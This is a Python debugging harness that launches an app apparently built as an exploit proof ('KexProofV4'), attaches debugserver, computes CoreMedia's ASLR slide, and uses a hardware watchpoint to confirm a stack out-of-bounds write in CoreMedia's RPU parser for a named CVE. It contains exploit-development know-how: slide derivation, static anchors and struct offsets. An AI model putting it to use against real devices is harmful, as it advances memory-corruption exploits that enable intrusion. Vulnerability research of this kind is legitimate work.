"""RPU watchpoint session for KexProofV4 (CVE-2026-112688).

Launches the app suspended with --run=rpu112688.armed, attaches debugserver,
computes the CoreMedia slide from the live VM map, breaks inside
CMGetDMVersionLevelFromRPU, then hardware-watches the first OOB record-store
write (struct + array offset). A hit CONFIRMS the stack OOB on-device.

Usage:
  python rpu_watch_session.py [block_id] [over]

Static anchors from the validated V3 session on iOS 27.0.1 (24A446):
  CoreMedia __TEXT static base = 0x18EE1B000
  parser entry-break static VA  = 0x18EFBF974
"""

import json
import re
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from rsp_client import RSPClient  # noqa: E402

BUNDLE_ID = "com.stealth.kexproofv4.ZK3K3TZ6JR"
STATIC_TEXT = 0x18EE1B000
STATIC_BREAK = 0x18EFBF974
MODULE_ARG = "--run=rpu112688.armed"
RSP_PORT = 12345


def sh(args, timeout=60):
    print("EXEC", " ".join(args), flush=True)
    result = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    return result.stdout + result.stderr


def launch_suspended():
    out = sh([sys.executable, "-m", "pymobiledevice3", "developer", "core-device",
              "launch-application", BUNDLE_ID, MODULE_ARG,
              "--kill-existing", "--suspended"], timeout=90)
    print(out, flush=True)
    match = re.search(r'"?pid"?[:=]\s*(\d+)', out)
    if match:
        return int(match.group(1))
    time.sleep(2)
    out = sh([sys.executable, "-m", "pymobiledevice3", "developer", "core-device",
              "list-processes"], timeout=60)
    for line in out.splitlines():
        if BUNDLE_ID in line or "KexProofV4" in line:
            digits = re.findall(r'\b(\d{2,7})\b', line)
            if digits:
                return int(digits[-1])
    raise RuntimeError("could not determine pid:\n" + out)


def coremedia_text_base(pid):
    out = sh([sys.executable, "-m", "pymobiledevice3", "developer", "dvt",
              "vm-regions", str(pid)], timeout=120)
    regions = json.loads(out)
    for region in regions:
        if region.get("path", "").endswith("CoreMedia.framework/CoreMedia") and region.get("type") == "__TEXT__":
            return int(region["start"])
    raise RuntimeError("CoreMedia __TEXT not found in vm-regions")


def watch_address(base, block_id, over):
    if block_id in (1, 10):
        return base + 0x7338 + (4 + over - 1) * 28 + 4
    if block_id == 2:
        return base + 0x71DC + (8 + over - 1) * 14
    if block_id == 6:
        return base + 0x726C + (5 + over - 1) * 36
    raise ValueError("unsupported block id")


def main():
    block_id = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    over = int(sys.argv[2]) if len(sys.argv) > 2 else 1

    server = subprocess.Popen(
        [sys.executable, "-m", "pymobiledevice3", "developer", "debugserver",
         "start-server", "--userspace", "--local-port", str(RSP_PORT)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    try:
        pid = launch_suspended()
        print(f"PID {pid}", flush=True)
        text_base = coremedia_text_base(pid)
        slide = text_base - STATIC_TEXT
        breakpoint = STATIC_BREAK + slide
        print(f"SLIDE 0x{slide:x} CoreMedia__TEXT=0x{text_base:x} break=0x{breakpoint:x}", flush=True)

        rsp = RSPClient(pid, port=RSP_PORT)
        entry_bp = False
        watch = None
        outcome = "NOT_OBSERVED"
        try:
            rsp.set_breakpoint(breakpoint, 0, 4)
            entry_bp = True
            print("CONTINUE_FOR_PARSE", flush=True)
            rsp.continue_and_wait(120)
            regs = rsp.registers()
            base = regs[31] + 0xC
            address = watch_address(base, block_id, over)
            print(f"RPU struct=0x{base:x} watch=0x{address:x} blockID={block_id} over={over}", flush=True)
            rsp.set_breakpoint(address, 2, 8)
            watch = (address, 2, 8)
            rsp.clear_breakpoint(breakpoint, 0, 4)
            entry_bp = False
            stop = rsp.continue_and_wait(120)
            text = stop.decode("utf-8", "backslashreplace")
            print(f"STOP {text}", flush=True)
            if "watchpoint" in text:
                outcome = "CONFIRMED_RPU_OOB"
                before = rsp.memory(address - 16, 32)
                rsp.step_and_wait()
                after = rsp.memory(address - 16, 32)
                print(f"BEFORE={before.hex()}", flush=True)
                print(f"AFTER={after.hex()}", flush=True)
            else:
                outcome = "STOP_WITHOUT_WATCHPOINT"
                rsp.registers()
        finally:
            if watch:
                try:
                    rsp.clear_breakpoint(*watch)
                except Exception as error:
                    print("CLEANUP_ERROR", repr(error), flush=True)
            if entry_bp:
                try:
                    rsp.clear_breakpoint(breakpoint, 0, 4)
                except Exception as error:
                    print("CLEANUP_ERROR", repr(error), flush=True)
            rsp.detach()
    finally:
        server.terminate()
    print(f"FINAL {outcome}", flush=True)


if __name__ == "__main__":
    main()
